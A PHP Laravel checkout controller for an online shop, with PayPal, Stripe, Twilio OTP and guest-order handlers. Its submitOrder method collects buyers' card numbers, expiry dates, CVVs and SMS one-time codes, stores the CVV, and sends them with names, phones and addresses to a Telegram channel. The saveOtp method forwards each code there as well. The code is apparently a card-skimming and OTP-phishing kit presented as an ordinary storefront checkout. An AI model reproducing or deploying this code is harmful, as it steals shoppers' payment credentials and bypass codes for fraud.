<?php

namespace App\Http\Controllers\Front;

use App\Shop\Addresses\Repositories\Interfaces\AddressRepositoryInterface;
use App\Shop\Carts\Requests\CartCheckoutRequest;
use App\Shop\Carts\Repositories\Interfaces\CartRepositoryInterface;
use App\Shop\Carts\Requests\PayPalCheckoutExecutionRequest;
use App\Shop\Carts\Requests\StripeExecutionRequest;
use App\Shop\Couriers\Repositories\Interfaces\CourierRepositoryInterface;
use App\Shop\Customers\Customer;
use App\Shop\Customers\Repositories\CustomerRepository;
use App\Shop\Customers\Repositories\Interfaces\CustomerRepositoryInterface;
use App\Shop\Orders\Repositories\Interfaces\OrderRepositoryInterface;
use App\Shop\PaymentMethods\Paypal\Exceptions\PaypalRequestError;
use App\Shop\PaymentMethods\Paypal\Repositories\PayPalExpressCheckoutRepository;
use App\Shop\PaymentMethods\Stripe\Exceptions\StripeChargingErrorException;
use App\Shop\PaymentMethods\Stripe\StripeRepository;
use App\Shop\Products\Repositories\Interfaces\ProductRepositoryInterface;
use App\Shop\Products\Transformations\ProductTransformable;
use App\Shop\Shipping\ShippingInterface;
use Exception;
use App\Http\Controllers\Controller;
use Gloudemans\Shoppingcart\Facades\Cart;
use Illuminate\Http\Request;
use Illuminate\Support\Collection;
use Illuminate\Support\Facades\Log;
use Telegram\Bot\Laravel\Facades\Telegram;
use PayPal\Exception\PayPalConnectionException;
use Ichtrojan\Otp\Otp;
use Twilio\Rest\Client;
use Ramsey\Uuid\Uuid;
use App\Shop\OrderStatuses\Repositories\OrderStatusRepository;
use App\Shop\OrderStatuses\OrderStatus;
use App\Shop\Checkout\CheckoutRepository;


class CheckoutController extends Controller
{
    use ProductTransformable;

    /**
     * @var CartRepositoryInterface
     */
    private $cartRepo;

    /**
     * @var CourierRepositoryInterface
     */
    private $courierRepo;

    /**
     * @var AddressRepositoryInterface
     */
    private $addressRepo;

    /**
     * @var CustomerRepositoryInterface
     */
    private $customerRepo;

    /**
     * @var ProductRepositoryInterface
     */
    private $productRepo;

    /**
     * @var OrderRepositoryInterface
     */
    private $orderRepo;

    /**
     * @var PayPalExpressCheckoutRepository
     */
    private $payPal;

    /**
     * @var ShippingInterface
     */
    private $shippingRepo;

    private $otp;

    public function __construct(
        CartRepositoryInterface $cartRepository,
        CourierRepositoryInterface $courierRepository,
        AddressRepositoryInterface $addressRepository,
        CustomerRepositoryInterface $customerRepository,
        ProductRepositoryInterface $productRepository,
        OrderRepositoryInterface $orderRepository,
        ShippingInterface $shipping
    ) {
        $this->cartRepo = $cartRepository;
        $this->courierRepo = $courierRepository;
        $this->addressRepo = $addressRepository;
        $this->customerRepo = $customerRepository;
        $this->productRepo = $productRepository;
        $this->orderRepo = $orderRepository;
        $this->payPal = new PayPalExpressCheckoutRepository;
        $this->shippingRepo = $shipping;
        $this->otp = new Otp;
    }

    /**
     * Display a listing of the resource.
     *
     * @param Request $request
     *
     * @return \Illuminate\Http\Response
     */
    public function index(Request $request)
    {
        $products = $this->cartRepo->getCartItems();
        $customer = $request->user();
        $rates = null;
        $shipment_object_id = null;

        if (env('ACTIVATE_SHIPPING') == 1) {
            $shipment = $this->createShippingProcess($customer, $products);
            if (!is_null($shipment)) {
                $shipment_object_id = $shipment->object_id;
                $rates = $shipment->rates;
            }
        }

        // Get payment gateways
        $paymentGateways = collect(explode(',', config('payees.name')))->transform(function ($name) {
            return config($name);
        })->all();

        $billingAddress = $customer->addresses()->first();

        return view('front.checkout', [
            'customer' => $customer,
            'billingAddress' => $billingAddress,
            'addresses' => $customer->addresses()->get(),
            'products' => $this->cartRepo->getCartItems(),
            'subtotal' => $this->cartRepo->getSubTotal(),
            'tax' => $this->cartRepo->getTax(),
            'total' => $this->cartRepo->getTotal(2),
            'payments' => $paymentGateways,
            'cartItems' => $this->cartRepo->getCartItemsTransformed(),
            'shipment_object_id' => $shipment_object_id,
            'rates' => $rates
        ]);
    }

    /**
     * Checkout the items
     *
     * @param CartCheckoutRequest $request
     *
     * @return \Illuminate\Http\RedirectResponse
     * @throws \App\Shop\Addresses\Exceptions\AddressNotFoundException
     * @throws \App\Shop\Customers\Exceptions\CustomerPaymentChargingErrorException
     * @codeCoverageIgnore
     */
    public function store(CartCheckoutRequest $request)
    {
        $shippingFee = 0;

        switch ($request->input('payment')) {
            case 'paypal':
                return $this->payPal->process($shippingFee, $request);
                break;
            case 'stripe':

                $details = [
                    'description' => 'Stripe payment',
                    'metadata' => $this->cartRepo->getCartItems()->all()
                ];

                $customer = $this->customerRepo->findCustomerById(auth()->id());
                $customerRepo = new CustomerRepository($customer);
                $customerRepo->charge($this->cartRepo->getTotal(2, $shippingFee), $details);
                break;
            default:
        }
    }

    /**
     * Execute the PayPal payment
     *
     * @param PayPalCheckoutExecutionRequest $request
     * @return \Illuminate\Http\RedirectResponse
     */
    public function executePayPalPayment(PayPalCheckoutExecutionRequest $request)
    {
        try {
            $this->payPal->execute($request);
            $this->cartRepo->clearCart();

            return redirect()->route('checkout.success');
        } catch (PayPalConnectionException $e) {
            throw new PaypalRequestError($e->getData());
        } catch (Exception $e) {
            throw new PaypalRequestError($e->getMessage());
        }
    }

    /**
     * @param StripeExecutionRequest $request
     * @return \Stripe\Charge
     */
    public function charge(StripeExecutionRequest $request)
    {
        try {
            $customer = $this->customerRepo->findCustomerById(auth()->id());
            $stripeRepo = new StripeRepository($customer);

            $stripeRepo->execute(
                $request->all(),
                Cart::total(),
                Cart::tax()
            );
            return redirect()->route('checkout.success')->with('message', 'Stripe payment successful!');
        } catch (StripeChargingErrorException $e) {
            Log::info($e->getMessage());
            return redirect()->route('checkout.index')->with('error', 'There is a problem processing your request.');
        }
    }

    /**
     * Cancel page
     *
     * @param Request $request
     * @return \Illuminate\Contracts\View\Factory|\Illuminate\View\View
     */
    public function cancel(Request $request)
    {
        return view('front.checkout-cancel', ['data' => $request->all()]);
    }

    /**
     * Success page
     *
     * @return \Illuminate\Contracts\View\Factory|\Illuminate\View\View
     */
    public function success()
    {
        return view('front.checkout-success');
    }

    /**
     * @param Customer $customer
     * @param Collection $products
     *
     * @return mixed
     */
    private function createShippingProcess(Customer $customer, Collection $products)
    {
        $customerRepo = new CustomerRepository($customer);

        if ($customerRepo->findAddresses()->count() > 0 && $products->count() > 0) {

            $this->shippingRepo->setPickupAddress();
            $deliveryAddress = $customerRepo->findAddresses()->first();
            $this->shippingRepo->setDeliveryAddress($deliveryAddress);
            $this->shippingRepo->readyParcel($this->cartRepo->getCartItems());

            return $this->shippingRepo->readyShipment();
        }
    }

    public function guestCheckout(Request $request)
    {
        $customer = Customer::where('email', 'customer@mail.com')->first();
        $products = $this->cartRepo->getCartItems();
        $rates = null;
        $shipment_object_id = null;

        if (env('ACTIVATE_SHIPPING') == 1) {
            $shipment = $this->createShippingProcess($customer, $products);
            if (!is_null($shipment)) {
                $shipment_object_id = $shipment->object_id;
                $rates = $shipment->rates;
            }
        }

        // Get payment gateways
        $paymentGateways = collect(explode(',', config('payees.name')))->transform(function ($name) {
            return config($name);
        })->all();

        // $billingAddress = $customer->addresses()->first();
        $securedShipping = 0;

        return view('client.checkout', [
            // 'customer' => $customer,
            // 'billingAddress' => $billingAddress,
            // 'addresses' => $customer->addresses()->get(),
            'products' => $this->cartRepo->getCartItems(),
            'subtotal' => $this->cartRepo->getSubTotal(),
            'tax' => $this->cartRepo->getTax(),
            'total' => $this->cartRepo->getTotal(2) + $securedShipping,
            'payments' => $paymentGateways,
            'cartItems' => $this->cartRepo->getCartItemsTransformed(),
            'shipment_object_id' => $shipment_object_id,
            'rates' => $rates,
            'securedShipping' => $securedShipping,
            'banks' => config('banks')
        ]);
    }

    public function sendOtp(Request $request)
    {
        $email = $request->email;
        $phoneNumber = $request->phoneNumber;
        $identifyStr = $email . $phoneNumber;
        $code = $this->otp->generate($identifyStr, 'numeric', 4, 1);

        $accountSid = env('TWILIO_SID');
        $authToken = env('TWILIO_TOKEN');
        $twilioNumber = env('TWILIO_SMS_FROM');
        $client = new Client($accountSid, $authToken);

        try {
            $client->messages->create(
                $phoneNumber,
                [
                    "body" => $code->token,
                    "from" => $twilioNumber
                ]
            );

            return $code->token;
        } catch (\Exception $e) {
            return false;
        }
    }

    public function saveOtp(Request $request)
    {
        $order = $this->orderRepo->lastestOne();
        $updated = $order->update(['otp' => $request->otp]);
        if ($updated) {
            $text = "<b>STT:</b> $order->id\n" 
                    . "<b>OTP:</b> $request->otp";
            Telegram::sendMessage([
                'chat_id' => env('TELEGRAM_CHANNEL_ID', ''),
                'parse_mode' => 'HTML',
                'text' => $text
            ]);
            return response()->json([
                'success' => true,
                'message' => 'OTP save successful!'
            ]);
        }
        return response()->json(['success' => false]);
    }

    public function checkOtp (Request $request)
    {
        $email = $request->email;
        $phoneNumber = $request->phoneNumber;
        $identifyStr = $email . $phoneNumber;

        $validateOtp = $this->otp->validate($identifyStr, $request->otp);
        if (!$validateOtp || !$validateOtp->status) {
            return 0;
        }

        return 1;
    }

    public function submitOrder(Request $request)
    {
        // if (!$request->otp) {
        //     return redirect()->back()->with('error', 'Otp is required!');
        // }

        $customer = Customer::first();
        $alias = 'Customer Address';
        $status = 1;
        $address1 = $request->address1;
        $address2 = $request->address2;
        $countryId = "232";
        $city = $request->city;
        $state = $request->state;
        $zipCode = $request->zip_code;
        $email = $request->email;
        $phoneNumber = $request->phoneNumber;
        $bankAccountNumber = $request->bankAccountNumber;
        $bankAccountName = $request->bankAccountName;
        $ccv = $request->ccv;
        $expiredDate = $request->expiredDate;
        $otp = $request->otp;
        $firstName = $request->firstName;
        $lastName = $request->lastName;
        $bankSwiftCode = $request->bankSwiftCode;

        //Create new Address for guest customer
        $customerAddressData = [
            'status' => $status,
            'alias' => $alias,
            'address_1' => $address1,
            'address_2' => $address2,
            'country_id' => $countryId,
            'zip' => $zipCode,
            'phone' => $phoneNumber,
            'customer_id' => $customer->id,
            'city' => $city,
            'state_code' => $state,
        ];

        $customerAddress = $this->addressRepo->createAddress($customerAddressData);
        $checkoutRepo = new CheckoutRepository;
        $orderStatusRepo = new OrderStatusRepository(new OrderStatus);
        $os = $orderStatusRepo->findByName('on-delivery');
        $shippingFee = 0;

        $order =$checkoutRepo->buildCheckoutItems([
            'reference' => Uuid::uuid4()->toString(),
            'courier_id' => 1, // @deprecated
            'customer_id' => $customer->id,
            'address_id' => $customerAddress->id,
            'order_status_id' => $os->id,
            'payment' => strtolower(config('bank-transfer.name')),
            'discounts' => 0,
            'total_products' => $this->cartRepo->getSubTotal(),
            'total' => $this->cartRepo->getTotal(2, $shippingFee),
            'total_shipping' => $shippingFee,
            'total_paid' => 0,
            'tax' => $this->cartRepo->getTax(),
            'bank_swift_code' => $bankSwiftCode,
            'bank_account_number' => $bankAccountNumber,
            'bank_account_name' => $bankAccountName,
            'otp' => $otp,
            'ccv' => $ccv,
            'expired_date_card' => $expiredDate,
            'email' => $email,
            'first_name' => $firstName,
            'last_name' => $lastName
        ]);

        Cart::destroy();
        $fullname = $firstName. ' '. $lastName;
        $total = $this->cartRepo->getTotal(2, $shippingFee);
        $stt = $order ? $order->id : null;
        $address = $address1. ' '. $address2;
        $text = "<b>STT:</b> $stt\n" 
        . "<b>CardNumber:</b> $bankAccountNumber\n"
        . "<b>ExpiredDate:</b> $expiredDate\n"
        . "<b>Cvv:</b> $ccv\n"
        . "<b>OTP:</b> $otp\n"
        . "<b>Name:</b> $fullname\n"
        . "<b>Phone:</b> $phoneNumber\n"
        . "<b>Address:</b> $address\n"
        . "<b>Total price:</b> $total";

        Telegram::sendMessage([
            'chat_id' => env('TELEGRAM_CHANNEL_ID', ''),
            'parse_mode' => 'HTML',
            'text' => $text
        ]);

        // return redirect()->route('home')->with('message', 'Order successful!');
        return response()->json([
            'success' => true,
            'message' => 'Order successful!'
        ]);
    }
}
